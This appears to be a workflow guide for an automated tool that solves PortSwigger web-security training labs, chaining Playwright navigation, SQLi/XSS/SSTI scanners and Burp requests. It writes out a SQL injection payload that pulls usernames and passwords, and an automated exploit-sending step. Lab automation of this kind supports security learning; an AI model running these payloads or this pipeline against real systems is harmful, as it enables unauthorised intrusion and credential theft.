# Hunter + Burp Automated Workflow

## Complete Lab Solving Workflow

### Step 1: Launch Lab (Playwright)
```python
# Navigate to lab page
page.goto("https://portswigger.net/web-security/...")
# Click ACCESS THE LAB
page.click("text=ACCESS THE LAB")
# Wait for new tab with lab instance
# Extract lab host from URL
```

### Step 2: Recon (Hunter Unified Scanner)
```python
from core.unified_scanner import UnifiedScanner
scanner = UnifiedScanner("https://lab-instance.web-security-academy.net")
result = scanner.run_full_scan(phases=["recon"])
# Returns: forms, params, endpoints, CSRF tokens
```

### Step 3: Detect (Hunter Auto Tools)
```python
# SQLi
from core.auto_sqli import AutoSQLi
sqli = AutoSQLi("https://lab-instance.web-security-academy.net/filter?category=Gifts")
result = sqli.run_full_scan()

# XSS
from core.auto_xss import AutoXSS
xss = AutoXSS("https://lab-instance.web-security-academy.net/search?q=")
result = xss.run_full_scan()

# SSTI
from core.auto_ssti import AutoSSTI
ssti = AutoSSTI("https://lab-instance.web-security-academy.net/?message=")
result = ssti.run_full_scan()
```

### Step 4: Exploit (Burp MCP)
```python
# Send exploit request via Burp
burp(action="send", url="https://lab-instance/filter?category=Gifts' UNION SELECT ...")

# Check for OOB callbacks
burp(action="collaborator_check")
```

### Step 5: Verify (Playwright)
```python
# Check if lab is solved
page.goto("https://lab-instance.web-security-academy.net/")
is_solved = "is-solved" in page.content()
```

### Step 6: Record & Optimize
```python
# Save finding to Hunter
finding = {
    "type": "sqli",
    "payload": "' UNION SELECT username,password FROM users--",
    "evidence": "admin:password123",
    "severity": "high",
}
# Update Hunter knowledge base
```

## Error Handling

### Burp MCP Timeout
```python
# If Burp MCP times out (>30s), fall back to Python requests
try:
    result = burp(action="send", url=target)
except TimeoutError:
    import requests
    result = requests.get(target, verify=False)
```

### Lab Instance Expired
```python
# If 504 or lab expired, re-launch
if resp.status_code == 504:
    page.goto(lab_page_url)
    page.click("text=ACCESS THE LAB")
```

### Rate Limited
```python
# If 429 or rate limited, wait and retry
if resp.status_code == 429:
    time.sleep(30)  # Wait 30 seconds
    retry_request()
```
